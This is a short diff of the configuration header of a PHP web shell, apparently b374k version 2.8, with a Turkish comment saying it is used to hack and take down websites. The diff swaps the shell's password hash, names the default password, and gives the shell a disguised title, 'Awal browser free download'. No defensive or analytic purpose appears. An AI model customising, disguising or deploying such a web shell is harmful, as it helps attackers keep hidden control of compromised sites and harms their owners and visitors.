@@ -2,7 +2,7 @@
 /*
 spam olarak k?t? g?r?nt?l? web sayfalar?n? hacklemek sistem d??? etmek  i?in kullan?l?r
 */
-$s_pass = "dfbcf2a4a5f30309424b10c99b293aba7ae0c81d"; // default password : b374k (login and change to new password)
+$s_pass = "5dd61fa0f74447618b3735458de5ca3c14bb05d8"; // default password : b374k (login and change to new password)
 
 $s_ver = "2.8"; // shell ver
 $s_title = "Awal browser free download ".$s_ver; // shell title
